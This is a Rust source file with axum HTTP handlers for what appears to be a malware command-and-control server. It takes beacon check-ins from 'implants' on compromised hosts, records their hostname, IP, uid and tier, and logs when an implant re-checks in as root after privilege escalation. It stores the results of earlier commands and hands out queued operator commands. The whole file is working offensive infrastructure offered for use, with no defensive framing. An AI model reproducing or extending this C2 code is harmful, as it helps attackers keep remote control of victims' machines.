/// Beacon handler — receives implant check-ins and returns queued commands.
use axum::{
    body::Bytes,
    extract::{ConnectInfo, Query, State},
    http::StatusCode,
    Json,
};
use std::net::SocketAddr;
use std::sync::Arc;

use crate::models::*;
use crate::state::AppState;
use crate::util;

/// GET /beacon?id=...&ts=...
pub async fn beacon_get(
    Query(q): Query<BeaconQuery>,
    State(state): State<Arc<AppState>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> (StatusCode, Json<serde_json::Value>) {
    let implant_id = q.id.unwrap_or_else(|| "?".into());
    let hostname = implant_id.clone();
    let ts = q.ts.unwrap_or_else(|| "?".into());
    let ip = addr.ip().to_string();

    util::log_line(&state.all_log, &format!("BEACON_GET  host={}  ts={}  ip={}", hostname, ts, ip));
    util::log_line(&state.beacon_log, &format!("BEACON  host={}  ts={}", hostname, ts));

    // Try to match existing session by hostname
    process_beacon(&state, &implant_id, &hostname, &ip, "1", "linux", "x86_64", 0, 0).await
}

/// POST /beacon — JSON body
pub async fn beacon_post(
    State(state): State<Arc<AppState>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    body: Bytes,
) -> (StatusCode, Json<serde_json::Value>) {
    let ip = addr.ip().to_string();

    // Try parsing as new-format beacon JSON
    if let Ok(beacon) = serde_json::from_slice::<BeaconPayload>(&body) {
        let implant_id = beacon.implant_id
            .or_else(|| beacon.hostname.clone())
            .or_else(|| beacon.host_legacy.clone())
            .unwrap_or_else(|| "?".into());
        let hostname = beacon.hostname
            .or(beacon.host_legacy)
            .unwrap_or_else(|| implant_id.clone());
        let tier = beacon.tier.unwrap_or_else(|| "1".into());
        let os = beacon.os.unwrap_or_else(|| "linux".into());
        let arch = beacon.arch.unwrap_or_else(|| "x86_64".into());
        let uid = beacon.uid.unwrap_or(0);
        let proto = beacon.protocol_version.unwrap_or(0);

        // Process last_result if present
        if let Some(ref result) = beacon.last_result {
            state.store_result(&implant_id, result.clone()).await;
        }

        let ts_str = match &beacon.ts {
            Some(serde_json::Value::Number(n)) => n.to_string(),
            Some(serde_json::Value::String(s)) => s.clone(),
            _ => "?".into(),
        };

        util::log_line(&state.all_log, &format!("BEACON  host={}  ts={}  ip={}  tier={}  uid={}", hostname, ts_str, ip, tier, uid));
        util::log_line(&state.beacon_log, &format!("BEACON  host={}  ts={}  tier={}", hostname, ts_str, tier));

        process_beacon(&state, &implant_id, &hostname, &ip, &tier, &os, &arch, uid, proto).await
    } else {
        // Legacy beacon — log and return empty commands
        let preview = String::from_utf8_lossy(&body[..body.len().min(200)]);
        util::log_line(&state.all_log, &format!("BEACON_LEGACY  raw={}  ip={}", preview, ip));
        util::log_line(&state.beacon_log, &format!("BEACON_LEGACY  raw={}", preview));

        (StatusCode::OK, Json(serde_json::json!({"commands": []})))
    }
}

/// Core beacon processing — shared between GET and POST.
async fn process_beacon(
    state: &Arc<AppState>,
    implant_id: &str,
    hostname: &str,
    ip: &str,
    tier: &str,
    os: &str,
    arch: &str,
    uid: u32,
    proto: u32,
) -> (StatusCode, Json<serde_json::Value>) {
    // Register/update session
    match state.ensure_session(implant_id, hostname, ip, tier, os, arch, uid, proto).await {
        crate::state::SessionUpdate::New => {
            state.broadcast_event(C2Event::NewSession {
                implant_id: implant_id.to_string(),
                hostname: hostname.to_string(),
                ip: ip.to_string(),
                tier: tier.to_string(),
                uid,
            });
        }
        crate::state::SessionUpdate::Escalated { from_uid } => {
            // Same session just checked in as root (privesc re-exec). Resolve
            // orphaned command bookkeeping so the operator sees the escalation
            // command complete and isn't left polling for a result that the
            // replaced process could never send.
            util::log_line(&state.all_log, &format!(
                "PRIVESC  host={}  uid {} -> 0 (escalation, same session)", implant_id, from_uid
            ));
            state.resolve_escalation(implant_id, from_uid).await;
            state.broadcast_event(C2Event::CommandResult {
                implant_id: implant_id.to_string(),
                command_id: "escalation".to_string(),
                status: "escalated".to_string(),
            });
        }
        crate::state::SessionUpdate::Existing => {}
    }

    state.broadcast_event(C2Event::Beacon {
        implant_id: implant_id.to_string(),
        ts: chrono::Utc::now().timestamp(),
    });

    // Dequeue commands if protocol version >= 1
    let commands = if proto >= 1 {
        let cmds = state.dequeue_commands(implant_id).await;
        cmds.iter().map(|c| c.to_response_json()).collect::<Vec<_>>()
    } else {
        Vec::new()
    };

    (StatusCode::OK, Json(serde_json::json!({
        "commands": commands,
        "stay_alive": false,
    })))
}
